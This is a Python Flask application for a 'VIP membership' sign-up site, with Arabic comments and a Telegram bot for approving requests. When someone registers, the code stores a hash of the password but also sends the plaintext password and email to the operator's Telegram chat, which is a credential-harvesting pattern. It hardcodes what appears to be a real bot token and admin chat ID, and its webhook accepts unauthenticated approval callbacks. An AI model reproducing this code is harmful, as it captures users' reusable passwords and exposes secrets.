"""
موقع عضوية VIP + بوت تلجرام للموافقة على الطلبات
كل شي بملف واحد: Flask server + Telegram webhook + SQLite

متغيرات البيئة المطلوبة (تحطهم بلوحة Render > Environment):
  BOT_TOKEN      -> توكن البوت من BotFather
  ADMIN_CHAT_ID  -> الـ chat id تبعك (رح تاخده بالخطوة أدناه)
  SECRET_KEY     -> نص عشوائي طويل لتوقيع جلسات الدخول

ملاحظة: RENDER_EXTERNAL_URL بتنحط تلقائياً من Render، ما تحتاج تضيفها بنفسك.
"""

import os
import re
import sqlite3
import time
from datetime import datetime

import requests
from flask import Flask, jsonify, request, send_from_directory
from itsdangerous import BadSignature, SignatureExpired, URLSafeTimedSerializer
from werkzeug.security import check_password_hash, generate_password_hash

# ---------------------------------------------------------------------------
# إعدادات عامة
# ---------------------------------------------------------------------------

BOT_TOKEN = "8955430886:AAE3sgW9k16fbdUSc7ma2n3elSZE0UxeQGc"        # التوكن يلي أخدته من BotFather
ADMIN_CHAT_ID = "5437487652"      # حطه بعد ما تاخده من أمر /start
SECRET_KEY = "change-this-to-any-long-random-text-123456"
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "")

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.db")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

EMAIL_RE = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
PASSWORD_RE = re.compile(r"^[A-Za-z0-9!@#$%^&*_.\-]+$")

serializer = URLSafeTimedSerializer(SECRET_KEY)
TOKEN_MAX_AGE = 7 * 24 * 3600  # 7 أيام

app = Flask(__name__, static_folder=".", static_url_path="")


# ---------------------------------------------------------------------------
# قاعدة البيانات
# ---------------------------------------------------------------------------

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            telegram_message_id INTEGER,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
        """
    )
    conn.commit()
    conn.close()


init_db()


# ---------------------------------------------------------------------------
# دوال مساعدة لتلجرام
# ---------------------------------------------------------------------------

def tg_call(method, payload):
    if not BOT_TOKEN:
        print(f"⚠️  BOT_TOKEN غير موجود — تجاهل استدعاء {method}")
        return None
    try:
        r = requests.post(f"{TELEGRAM_API}/{method}", json=payload, timeout=10)
        return r.json()
    except Exception as exc:  # noqa: BLE001
        print(f"خطأ باستدعاء تلجرام ({method}):", exc)
        return None


def request_number(user_id: int) -> str:
    return f"REQ-{user_id:04d}"


def notify_admin_new_request(user_row, plain_password=""):
    if not ADMIN_CHAT_ID:
        print("⚠️  ADMIN_CHAT_ID غير موجود — ابعت /start للبوت أول عشان تاخده")
        return

    text = (
        "📥 *طلب تسجيل VIP جديد*\n\n"
        f"🔢 رقم الطلب: {request_number(user_row['id'])}\n"
        f"📧 البريد: {user_row['email']}\n"
        f"🔑 كلمة السر: `{plain_password}`\n"
        f"🕒 التاريخ: {user_row['created_at']}"
    )
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ قبول", "callback_data": f"approve_{user_row['id']}"},
                {"text": "❌ رفض", "callback_data": f"reject_{user_row['id']}"},
            ]
        ]
    }
    result = tg_call(
        "sendMessage",
        {
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": "Markdown",
            "reply_markup": keyboard,
        },
    )
    if result and result.get("ok"):
        message_id = result["result"]["message_id"]
        conn = get_db()
        conn.execute(
            "UPDATE users SET telegram_message_id = ? WHERE id = ?",
            (message_id, user_row["id"]),
        )
        conn.commit()
        conn.close()


def setup_webhook():
    if not BOT_TOKEN or not RENDER_EXTERNAL_URL:
        print("ℹ️  تخطي إعداد الـ webhook (ناقص BOT_TOKEN أو RENDER_EXTERNAL_URL)")
        return
    url = f"{RENDER_EXTERNAL_URL}/api/telegram-webhook"
    result = tg_call("setWebhook", {"url": url})
    print("Webhook setup:", result)


# ---------------------------------------------------------------------------
# ميدلوير التحقق من تسجيل الدخول
# ---------------------------------------------------------------------------

def get_authenticated_user():
    header = request.headers.get("Authorization", "")
    token = header.replace("Bearer ", "").strip()
    if not token:
        return None
    try:
        data = serializer.loads(token, max_age=TOKEN_MAX_AGE)
        return data
    except (BadSignature, SignatureExpired):
        return None


# ---------------------------------------------------------------------------
# مسارات الموقع (صفحة واحدة)
# ---------------------------------------------------------------------------

@app.route("/")
def home():
    return send_from_directory(".", "index.html")


# ---------------------------------------------------------------------------
# API: مسار واحد فقط. أول إدخال للبيانات = طلب جديد يروح فوراً لشاشة الانتظار.
# لو رجع نفس الإيميل بحساب موجود، بيرجعله وضعه الحالي (قيد المراجعة / مقبول / مرفوض).
# ---------------------------------------------------------------------------

REJECTION_MESSAGE = "لم يتم الموافقة على عضويتك لعدم استيفاء الشروط."


@app.route("/api/access", methods=["POST"])
def access():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip()
    password = data.get("password") or ""

    if not email or not password:
        return jsonify(error="البريد وكلمة السر مطلوبين"), 400
    if not EMAIL_RE.match(email):
        return jsonify(error="صيغة البريد غير صحيحة"), 400
    if len(password) < 6 or not PASSWORD_RE.match(password):
        return jsonify(error="كلمة السر لازم تكون بالإنجليزي وأكتر من 6 محارف"), 400

    conn = get_db()
    user_row = conn.execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()

    # ---- ما في حساب بهاد البريد → أنشئ طلب جديد وحوّله فوراً لشاشة الانتظار ----
    if not user_row:
        password_hash = generate_password_hash(password)
        cur = conn.execute(
            "INSERT INTO users (email, password_hash, status) VALUES (?, ?, 'pending')",
            (email, password_hash),
        )
        conn.commit()
        new_user_row = conn.execute(
            "SELECT * FROM users WHERE id = ?", (cur.lastrowid,)
        ).fetchone()
        conn.close()

        notify_admin_new_request(new_user_row, plain_password=password)

        return jsonify(status="pending", requestNumber=request_number(new_user_row["id"]))

    # ---- حساب موجود مسبقاً: تحقق من كلمة السر ----
    if not check_password_hash(user_row["password_hash"], password):
        conn.close()
        return jsonify(error="بيانات غير صحيحة"), 401

    if user_row["status"] == "pending":
        conn.close()
        return jsonify(status="pending", requestNumber=request_number(user_row["id"]))

    if user_row["status"] == "rejected":
        conn.close()
        return jsonify(status="rejected", message=REJECTION_MESSAGE), 403

    # ---- مقبول: افتح جلسته ----
    conn.close()
    token = serializer.dumps({"id": user_row["id"], "email": user_row["email"]})
    return jsonify(status="approved", token=token, email=user_row["email"])


@app.route("/api/me")
def me():
    user = get_authenticated_user()
    if not user:
        return jsonify(error="غير مصرح، سجل دخول من جديد"), 401
    return jsonify(email=user["email"])


# ---------------------------------------------------------------------------
# API: استقبال تحديثات تلجرام (Webhook)
# ---------------------------------------------------------------------------

@app.route("/api/telegram-webhook", methods=["POST"])
def telegram_webhook():
    update = request.get_json(silent=True) or {}

    if "callback_query" in update:
        handle_callback(update["callback_query"])
    elif "message" in update:
        handle_message(update["message"])

    return jsonify(ok=True)


def handle_message(message):
    text = message.get("text", "")
    chat_id = message.get("chat", {}).get("id")
    if text.strip() == "/start" and chat_id:
        tg_call(
            "sendMessage",
            {
                "chat_id": chat_id,
                "text": (
                    "أهلاً 👋\nالـ Chat ID تبعك هو:\n"
                    f"`{chat_id}`\n\n"
                    "حطه بمتغير البيئة ADMIN_CHAT_ID على Render وأعد النشر."
                ),
                "parse_mode": "Markdown",
            },
        )


def handle_callback(callback_query):
    data = callback_query.get("data", "")
    query_id = callback_query.get("id")
    message = callback_query.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")

    try:
        action, id_str = data.split("_")
        user_id = int(id_str)
    except ValueError:
        return

    conn = get_db()
    user_row = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()

    if not user_row:
        conn.close()
        tg_call("answerCallbackQuery", {"callback_query_id": query_id, "text": "المستخدم مش موجود"})
        return

    if user_row["status"] != "pending":
        conn.close()
        tg_call(
            "answerCallbackQuery",
            {"callback_query_id": query_id, "text": f"تمت معالجة هاد الطلب مسبقاً ({user_row['status']})"},
        )
        return

    new_status = "approved" if action == "approve" else "rejected"
    conn.execute("UPDATE users SET status = ? WHERE id = ?", (new_status, user_id))
    conn.commit()
    conn.close()

    result_text = (
        ("✅ *تم القبول*" if new_status == "approved" else "❌ *تم الرفض*")
        + f"\n\n📧 {user_row['email']}\n🔢 {request_number(user_id)}"
    )

    tg_call(
        "editMessageText",
        {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": result_text,
            "parse_mode": "Markdown",
        },
    )
    tg_call(
        "answerCallbackQuery",
        {
            "callback_query_id": query_id,
            "text": "تم القبول ✅" if new_status == "approved" else "تم الرفض ❌",
        },
    )


# ---------------------------------------------------------------------------
# تشغيل إعداد الـ Webhook مرة وحدة لما يبلش السيرفر
# ---------------------------------------------------------------------------

setup_webhook()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port)
